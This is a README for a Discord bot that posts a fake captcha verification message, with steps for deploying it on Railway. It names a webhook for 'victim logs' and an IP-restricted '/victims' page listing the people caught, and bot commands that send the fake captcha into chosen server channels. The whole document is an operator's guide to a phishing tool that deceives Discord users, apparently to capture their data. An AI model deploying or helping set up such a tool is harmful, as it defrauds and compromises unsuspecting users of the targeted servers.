# Discord Fake Captcha Bot — Railway Ready

## Environment Variables (set these in Railway)

- `DISCORD_TOKEN` — Bot token
- `DISCORD_CLIENT_ID` — Bot application/client ID
- `DISCORD_GUILD_ID` — Private server ID for slash command registration
- `DISCORD_OWNER_IDS` — Comma-separated owner user IDs (e.g. `123,456`)
- `DISCORD_WEBHOOK` — Webhook URL for victim logs

Enable all privileged intents in the Discord Developer Portal.

## Deploy to Railway

1. Create a new project on [Railway](https://railway.app).
2. Deploy from GitHub repo or upload this folder.
3. Add the environment variables above.
4. Railway will auto-detect Node and run `npm start`.
5. After deploy, note your public domain (e.g. `your-app.up.railway.app`).

## Post-deploy bot commands

- `/domain your-app.up.railway.app` — set the domain (no https)
- `/ip <your-ip> true` — whitelist IP for `/victims` endpoint
- `/verification <serverId> <channelId>` — send the fake captcha embed

Logs go to the webhook you configured.

## Notes

- Server listens on `process.env.PORT` (Railway injects this).
- Victims list: `https://your-domain/victims` (IP-restricted).
- Original project by opolarlofy.
